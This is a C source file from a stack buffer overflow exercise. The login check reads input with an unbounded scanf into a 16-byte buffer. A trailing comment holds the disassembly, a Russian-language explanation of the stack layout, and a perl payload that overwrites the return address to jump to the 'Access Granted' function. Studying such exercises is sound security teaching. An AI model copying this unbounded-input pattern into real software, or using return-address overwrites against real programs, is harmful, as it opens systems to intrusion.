#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void granted()
{
	printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	printf("      Access Granted.\n");
	printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
}

int check_authentication()
{
	char password_buffer[16];

	scanf("%s", password_buffer);

	if (strcmp(password_buffer, "brillig") == 0)
		return 1;
	if (strcmp(password_buffer, "outgrabe") == 0)
		return 1;

	return 0;
}

int main(int argc, char *argv[])
{
	if (check_authentication()) {
		granted();
	} else {
		printf("\nAccess Denied.\n");
   }
}

/*
00000000004005a7 <granted>:
  4005a7:	55                   	push   %rbp
  4005a8:	48 89 e5             	mov    %rsp,%rbp
  4005ab:	48 8d 3d 52 01 00 00 	lea    0x152(%rip),%rdi        # 400704 <_IO_stdin_used+0x4>
  4005b2:	e8 d9 fe ff ff       	callq  400490 <puts@plt>
  4005b7:	48 8d 3d 63 01 00 00 	lea    0x163(%rip),%rdi        # 400721 <_IO_stdin_used+0x21>
  4005be:	e8 cd fe ff ff       	callq  400490 <puts@plt>
  4005c3:	48 8d 3d 6d 01 00 00 	lea    0x16d(%rip),%rdi        # 400737 <_IO_stdin_used+0x37>
  4005ca:	e8 c1 fe ff ff       	callq  400490 <puts@plt>
  4005cf:	90                   	nop
  4005d0:	5d                   	pop    %rbp
  4005d1:	c3                   	retq

00000000004005d2 <check_authentication>:
  4005d2:	55                   	push   %rbp
  4005d3:	48 89 e5             	mov    %rsp,%rbp
  4005d6:	48 83 ec 10          	sub    $0x10,%rsp
  4005da:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
  4005de:	48 89 c6             	mov    %rax,%rsi
  4005e1:	48 8d 3d 6b 01 00 00 	lea    0x16b(%rip),%rdi        # 400753 <_IO_stdin_used+0x53>
  4005e8:	b8 00 00 00 00       	mov    $0x0,%eax
  4005ed:	e8 be fe ff ff       	callq  4004b0 <__isoc99_scanf@plt>
  4005f2:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
  4005f6:	48 8d 35 59 01 00 00 	lea    0x159(%rip),%rsi        # 400756 <_IO_stdin_used+0x56>
  4005fd:	48 89 c7             	mov    %rax,%rdi
  400600:	e8 9b fe ff ff       	callq  4004a0 <strcmp@plt>
  400605:	85 c0                	test   %eax,%eax
  400607:	75 07                	jne    400610 <check_authentication+0x3e>
  400609:	b8 01 00 00 00       	mov    $0x1,%eax
  40060e:	eb 23                	jmp    400633 <check_authentication+0x61>
  400610:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
  400614:	48 8d 35 43 01 00 00 	lea    0x143(%rip),%rsi        # 40075e <_IO_stdin_used+0x5e>
  40061b:	48 89 c7             	mov    %rax,%rdi
  40061e:	e8 7d fe ff ff       	callq  4004a0 <strcmp@plt>
  400623:	85 c0                	test   %eax,%eax
  400625:	75 07                	jne    40062e <check_authentication+0x5c>
  400627:	b8 01 00 00 00       	mov    $0x1,%eax
  40062c:	eb 05                	jmp    400633 <check_authentication+0x61>
  40062e:	b8 00 00 00 00       	mov    $0x0,%eax
  400633:	c9                   	leaveq
  400634:	c3                   	retq

0000000000400635 <main>:
  400635:	55                   	push   %rbp
  400636:	48 89 e5             	mov    %rsp,%rbp
  400639:	48 83 ec 10          	sub    $0x10,%rsp
  40063d:	89 7d fc             	mov    %edi,-0x4(%rbp)
  400640:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
  400644:	b8 00 00 00 00       	mov    $0x0,%eax
  400649:	e8 84 ff ff ff       	callq  4005d2 <check_authentication>
  40064e:	85 c0                	test   %eax,%eax
  400650:	74 0c                	je     40065e <main+0x29>
  400652:	b8 00 00 00 00       	mov    $0x0,%eax
  400657:	e8 4b ff ff ff       	callq  4005a7 <granted>
  40065c:	eb 0c                	jmp    40066a <main+0x35>
  40065e:	48 8d 3d 02 01 00 00 	lea    0x102(%rip),%rdi        # 400767 <_IO_stdin_used+0x67>
  400665:	e8 26 fe ff ff       	callq  400490 <puts@plt>
  40066a:	b8 00 00 00 00       	mov    $0x0,%eax
  40066f:	c9                   	leaveq
  400670:	c3                   	retq
  400671:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  400678:	00 00 00
  40067b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

   В данном случае уязвимость возникает не из-за перезаписи переменной флага, а из-за перезаписи адреса функции grated
   поверх адреса возврата.
   Дано:
   Стрктура стека:
    -   Локальные данные.
    -   Указатель кадра.
    -   Адрес возврата.

   Смещение под буфер: 0x10 == 16 байт.
   Больше локальных данных в фокции <check_authentication> нет => размер локальных данных = 16 байт.
   Размер указателя кадра, учитывая 64 битные регистры, = 8 байт.

   Следовательно:

   Для перезаписи адреса возврата потребуется вписать
   16 любых символов + 8 любых символов + <адрес granted> (1 символ - 1 байт занимаемого места).
   Для достижения этого потребуется использовать дополнительные команды, чтобы корректно вписать адрес.
   Результирующая команда: perl -e 'print "123456789012345678901234" . "\xa7\x05\x40" . "\x00"x5' | ./auth_overflow2
 */
